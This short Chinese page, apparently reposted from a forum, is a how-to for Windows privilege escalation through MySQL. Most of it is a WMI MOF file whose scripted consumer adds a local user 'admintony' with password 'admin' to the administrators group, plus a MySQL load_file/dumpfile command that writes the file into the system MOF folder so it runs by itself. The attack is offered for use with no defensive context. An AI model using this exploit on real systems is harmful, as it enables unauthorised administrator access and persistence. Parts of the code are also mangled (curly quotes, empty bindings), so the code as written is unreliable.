# MOF手工提权辅助

> 原文：[https://www.zhihuifly.com/t/topic/3528](https://www.zhihuifly.com/t/topic/3528)

# MOF 提权：

```
#pragma namespace("\\.\root\subscription") 

instance of __EventFilter as

{

EventNamespace = “Root\Cimv2”;

Name  = “filtP2”;

Query = "Select * From __InstanceModificationEvent "

"Where TargetInstance Isa “Win32_LocalTime” "

“And TargetInstance.Second = 5”;

QueryLanguage = “WQL”;

};

instance of ActiveScriptEventConsumer as

{

Name = “consPCSV2”;

ScriptingEngine = “JScript”;

ScriptText =

“var WSH = new ActiveXObject(“WScript.Shell”) WSH.run(“net.exe user admintony admin /add&&net.exe localgroup administrators admintony /add”)”;

}; `instance of __FilterToConsumerBinding

{

Consumer   = ;

Filter = ;

};` 
```

保存为 1.mof

然后mysql执行

```
select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; 
```